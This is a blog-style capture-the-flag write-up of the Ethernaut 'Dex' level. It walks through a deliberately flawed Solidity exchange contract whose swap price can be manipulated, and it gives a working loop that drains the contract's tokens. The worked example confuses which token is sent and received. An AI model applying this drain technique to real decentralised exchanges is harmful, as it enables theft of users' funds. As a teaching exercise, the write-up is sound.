###########################
Ethernaut 22: Dex
###########################
:date: 2023-10-29
:slug: ethernaut-22-dex
:summary: they see me roundin' \\n they hatin'
:tags: programming
:author: capu
:featured_image:

Objective
=========
Drain the contract of one of one of the tokens

Code
====
.. code-block:: solidity
    :linenos: inline
    :hl_lines: 54 55

    contract Dex is Ownable {
        address public token1;
        address public token2;

        constructor() {}

        function setTokens(
            address _token1,
            address _token2
        ) public onlyOwner {
            token1 = _token1;
            token2 = _token2;
        }

        function addLiquidity(
            address token_address,
            uint256 amount
        ) public onlyOwner {
            IERC20(token_address).transferFrom(
                msg.sender, address(this),
                amount
            );
        }

        function swap(address from, address to, uint256 amount) public {
            require(
                (from == token1 && to == token2) ||
                (from == token2 && to == token1)
                , "Invalid tokens"
            );
            require(
                IERC20(from).balanceOf(msg.sender) >= amount,
                "Not enough to swap"
            );
            uint256 swapAmount = getSwapPrice(from, to, amount);
            IERC20(from).transferFrom(
                msg.sender,
                address(this),
                amount
            );
            IERC20(to).approve(address(this), swapAmount);
            IERC20(to).transferFrom(
                address(this),
                msg.sender,
                swapAmount
            );
        }

        function getSwapPrice(
            address from,
            address to,
            uint256 amount
        ) public view returns (uint256) {
            return ((amount * IERC20(to).balanceOf(address(this)))
            / IERC20(from).balanceOf(address(this)));
        }
    }

The starting conditions are

.. code-block:: plain
    :linenos: inline
    :hl_lines: 

    balances of the dex contract:
        token1: 100
        token2: 100

    balances of the attacker:
        token1: 10
        token2: 10

Solution
========
the amount that I'll receive by sending ``amount`` of token ``from`` is defined
on lines 54-55 of the contract, as follows:

.. code-block:: solidity
    :linenos: inline
    :hl_lines: 

    (amount * IERC20(to).balanceOf(address(this)))
        / IERC20(from).balanceOf(address(this));

Some examples

- if I trade ``9 token1``, I'll receive ``9 token2``: ``9 *100/100 == 9``
- if I then trade my remaining ``1 token1``, I'll receive ``1 token2``: ``1*109/91 == 1.197``, but integer aritmethic will truncate it to 1.

This price equation tries to arrive at a 'fair' price by making tokens that are
more scarce to the contract more expensive to purchase.

The workaround then might be in artificially making one of the tokens more
valuable in the contract, by just sending it more of the other without receiving
anything in return. Consider the following example:

1. I send ``10 token1`` to the DEX contract with a regular ERC20 transfer
2. I trade my ``10 token2`` for... ``10*110/100 == 11 token2``. I got a better
   price than if I traded without sending first! however, I'm now holding 11
   tokens total, instead of the 20 I'd be holding if I either skipped step 1 or
   didn't trade altogether. This'd only make sense if I could...
3. Trade my ``11 token2`` for... ``11*120/110 == 12 token2`` 🤑

I can keep on doing that until I fully drain the contract of funds!

.. code-block:: solidity
    :linenos: inline

    SwappableToken tkn1 = SwappableToken(target.token1());
    SwappableToken tkn2 = SwappableToken(target.token2());
    target.approve(address(target), 1000);
    tkn2.transfer(address(target), 10);
    uint i = tkn1.balanceOf(attacker);
    while (i<100 && i>0) {
        target.swap(address(tkn1), address(tkn2), i);
        i = min(
            tkn2.balanceOf(attacker),
            tkn2.balanceOf(address(target))
        );
        if(i == 0 ) break;
        target.swap(address(tkn2), address(tkn1), i);
        i = min(
            tkn1.balanceOf(attacker),
            tkn1.balanceOf(address(target))
        );
    }

Although I have to take care to not ask for a trade that the contract cannot
fulfill due to lack of funds. That's why the ``break`` is there and why I have
to choose between the minimum of my balance and the contract's
